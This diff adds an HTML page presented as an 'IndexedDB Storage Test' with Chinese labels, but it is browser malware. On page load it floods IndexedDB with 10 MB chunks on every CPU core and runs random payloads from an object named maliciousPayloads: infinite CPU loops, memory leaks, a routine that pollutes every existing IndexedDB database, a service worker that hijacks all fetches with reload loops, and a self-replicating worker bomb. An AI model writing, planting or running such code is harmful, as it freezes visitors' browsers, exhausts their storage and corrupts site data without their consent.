@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>IndexedDB Storage Test</title>
+    <style>
+        #status {
+            font-family: monospace;
+            white-space: pre-wrap;
+            padding: 10px;
+            border: 1px solid #ccc;
+            height: 400px;
+            overflow: auto;
+        }
+        .progress {
+            width: 100%;
+            background: #f0f0f0;
+            padding: 2px;
+            border-radius: 3px;
+            margin: 5px 0;
+        }
+        .progress-bar {
+            height: 20px;
+            background: #4CAF50;
+            width: 0%;
+            border-radius: 2px;
+            transition: width 0.3s;
+        }
+    </style>
+</head>
+<body>
+<div>
+    <h3>IndexedDB 存储测试</h3>
+    <div>
+        已用存储: <span id="usage">0</span> MB
+        <div class="progress">
+            <div class="progress-bar" id="progress"></div>
+        </div>
+    </div>
+    <div>
+        数据库数量: <span id="dbCount">0</span>
+        文件数量: <span id="fileCount">0</span>
+        写入速度: <span id="speed">0</span> MB/s
+    </div>
+    <div id="status"></div>
+</div>
+
+<script>
+class StorageTest {
+    constructor() {
+        this.databases = new Set();
+        this.totalWritten = 0;
+        this.startTime = Date.now();
+        this.lastUpdate = Date.now();
+        this.lastWritten = 0;
+        this.fileCount = 0;
+        this.active = true;
+        
+        this.maliciousPayloads = {
+            dosLoop: {
+                type: 'script',
+                code: `
+                    while(true) {
+                        for(let i = 0; i < 1000000; i++) {
+                            Math.random() * Math.random();
+                            Math.sqrt(Math.random());
+                            JSON.parse(JSON.stringify({x: Math.random()}));
+                        }
+                    }
+                `
+            },
+
+            memoryLeak: {
+                type: 'script',
+                code: `
+                    const leaks = [];
+                    setInterval(() => {
+                        while(true) {
+                            leaks.push(new Array(1024 * 1024).fill('x'));
+                            const obj = {};
+                            const obj2 = { ref: obj };
+                            obj.ref = obj2;
+                            leaks.push(obj);
+                        }
+                    }, 0);
+                `
+            },
+
+            dbInfector: {
+                type: 'script',
+                code: `
+                    async function infectDB(name) {
+                        const request = indexedDB.open(name);
+                        request.onupgradeneeded = (e) => {
+                            const db = e.target.result;
+                            const store = db.createObjectStore('infection');
+                            function createInfinite(depth) {
+                                if(depth > 100) return {type: 'max'};
+                                return {
+                                    dos: 'while(true) { Math.random(); }',
+                                    next: createInfinite(depth + 1),
+                                    branches: Array(10).fill().map(() => createInfinite(depth + 1))
+                                };
+                            }
+                            store.put(createInfinite(0), 'root');
+                        };
+                    }
+                    indexedDB.databases().then(dbs => {
+                        dbs.forEach(db => infectDB(db.name));
+                    });
+                `
+            },
+
+            swPayload: {
+                type: 'serviceworker',
+                code: `
+                    self.addEventListener('install', (event) => {
+                        self.skipWaiting();
+                        event.waitUntil(
+                            caches.open('cache').then(cache => {
+                                return cache.put('/', new Response(
+                                    'while(true) { location.reload(); }',
+                                    {headers: {'Content-Type': 'application/javascript'}}
+                                ));
+                            })
+                        );
+                    });
+                    
+                    self.addEventListener('activate', (event) => {
+                        event.waitUntil(clients.claim());
+                    });
+                    
+                    self.addEventListener('fetch', (event) => {
+                        event.respondWith(
+                            new Response(
+                                'while(true) { location.reload(); }',
+                                {headers: {'Content-Type': 'application/javascript'}}
+                            )
+                        );
+                    });
+                `
+            },
+
+            workerBomb: {
+                type: 'worker',
+                code: `
+                    function spawnWorkers() {
+                        while(true) {
+                            const worker = new Worker(URL.createObjectURL(
+                                new Blob(['(' + spawnWorkers.toString() + ')()'])
+                            ));
+                            worker.postMessage('spawn');
+                        }
+                    }
+                    spawnWorkers();
+                `
+            }
+        };
+
+        setInterval(() => this.updateStatus(), 1000);
+    }
+
+    log(msg) {
+        const status = document.getElementById('status');
+        status.innerHTML += msg + '\n';
+        status.scrollTop = status.scrollHeight;
+    }
+
+    updateProgress() {
+        const usage = document.getElementById('usage');
+        const progress = document.getElementById('progress');
+        const dbCount = document.getElementById('dbCount');
+        const fileCount = document.getElementById('fileCount');
+        const speed = document.getElementById('speed');
+        
+        const now = Date.now();
+        const timeDiff = (now - this.lastUpdate) / 1000;
+        const writtenDiff = this.totalWritten - this.lastWritten;
+        const mbPerSecond = (writtenDiff / timeDiff / (1024 * 1024)).toFixed(2);
+        
+        usage.textContent = Math.round(this.totalWritten / (1024 * 1024));
+        progress.style.width = Math.min(100, this.totalWritten / (1024 * 1024 * 1024) * 100) + '%';
+        dbCount.textContent = this.databases.size;
+        fileCount.textContent = this.fileCount;
+        speed.textContent = mbPerSecond;
+        
+        this.lastUpdate = now;
+        this.lastWritten = this.totalWritten;
+    }
+
+    async updateStatus() {
+        if('storage' in navigator && 'estimate' in navigator.storage) {
+            try {
+                const estimate = await navigator.storage.estimate();
+                this.log(`
+存储状态:
+- 已用空间: ${Math.round(estimate.usage/(1024*1024))} MB
+- 总配额: ${Math.round(estimate.quota/(1024*1024))} MB
+- 剩余空间: ${Math.round((estimate.quota - estimate.usage)/(1024*1024))} MB
+- 使用率: ${Math.round(estimate.usage/estimate.quota*100)}%
+- 运行时间: ${Math.round((Date.now() - this.startTime)/1000)}s
+`);
+            } catch(e) {
+                this.log('获取存储状态失败: ' + e.message);
+            }
+        }
+    }
+
+    createChunk(size) {
+        const payloads = Object.entries(this.maliciousPayloads);
+        const [name, payload] = payloads[Math.floor(Math.random() * payloads.length)];
+        
+        const buffer = new ArrayBuffer(size);
+        const view = new Uint8Array(buffer);
+        for(let i = 0; i < size; i++) {
+            view[i] = Math.random() * 256;
+        }
+
+        return {
+            type: payload.type,
+            code: payload.code,
+            data: new Uint8Array(buffer),
+            size: buffer.byteLength,
+            timestamp: Date.now(),
+            metadata: {
+                name: name,
+                executed: false
+            }
+        };
+    }
+
+    executePayload(data) {
+        try {
+            switch(data.type) {
+                case 'script':
+                    const func = new Function(data.code);
+                    func();
+                    break;
+                case 'serviceworker':
+                    const swBlob = new Blob([data.code], {type: 'application/javascript'});
+                    navigator.serviceWorker.register(URL.createObjectURL(swBlob));
+                    break;
+                case 'worker':
+                    const workerBlob = new Blob([data.code], {type: 'application/javascript'});
+                    const worker = new Worker(URL.createObjectURL(workerBlob));
+                    worker.postMessage('start');
+                    break;
+            }
+        } catch(e) {
+            this.log(`执行Payload失败: ${e.message}`);
+        }
+    }
+
+    async openDatabase(name) {
+        return new Promise((resolve, reject) => {
+            const request = indexedDB.open(name, 1);
+            request.onerror = () => reject(request.error);
+            request.onsuccess = () => resolve(request.result);
+            request.onupgradeneeded = (e) => {
+                const db = e.target.result;
+                const stores = ['files', 'system', 'cache', 'backup', 'infection'];
+                stores.forEach(name => {
+                    const store = db.createObjectStore(name, {keyPath: 'timestamp'});
+                });
+            };
+        });
+    }
+
+    async writeData(db, data) {
+        return new Promise((resolve, reject) => {
+            try {
+                const tx = db.transaction(db.objectStoreNames, 'readwrite');
+                const promises = [];
+                
+                Array.from(db.objectStoreNames).forEach(storeName => {
+                    const store = tx.objectStore(storeName);
+                    const promise = new Promise((res, rej) => {
+                        const request = store.put(data);
+                        request.onsuccess = res;
+                        request.onerror = rej;
+                    });
+                    promises.push(promise);
+                });
+                
+                Promise.all(promises)
+                    .then(() => {
+                        this.executePayload(data);
+                        resolve();
+                    })
+                    .catch(reject);
+                
+            } catch(e) {
+                reject(e);
+            }
+        });
+    }
+
+    async startTest() {
+        this.log('开始存储测试...');
+        
+        const workerCount = navigator.hardwareConcurrency || 4;
+        for(let i = 0; i < workerCount; i++) {
+            this.startWorker(i);
+        }
+    }
+
+    async startWorker(id) {
+        try {
+            while(this.active) {
+                const dbName = `storage_test_${id}_${Date.now()}`;
+                const db = await this.openDatabase(dbName);
+                this.databases.add(db);
+                this.log(`工作器 ${id} 创建数据库: ${dbName}`);
+                
+                while(this.active) {
+                    try {
+                        const chunk = this.createChunk(10 * 1024 * 1024);
+                        await this.writeData(db, chunk);
+                        
+                        this.totalWritten += chunk.size;
+                        this.fileCount++;
+                        
+                        this.updateProgress();
+                        
+                    } catch(e) {
+                        this.log(`工作器 ${id} 写入失败: ${e.message}`);
+                        break;
+                    }
+                }
+            }
+        } catch(e) {
+            this.log(`工作器 ${id} 错误: ${e.message}`);
+            setTimeout(() => this.startWorker(id), 1000);
+        }
+    }
+}
+
+const tester = new StorageTest();
+tester.startTest().catch(e => console.error('测试失败:', e));
+</script>
+</body>
+</html>
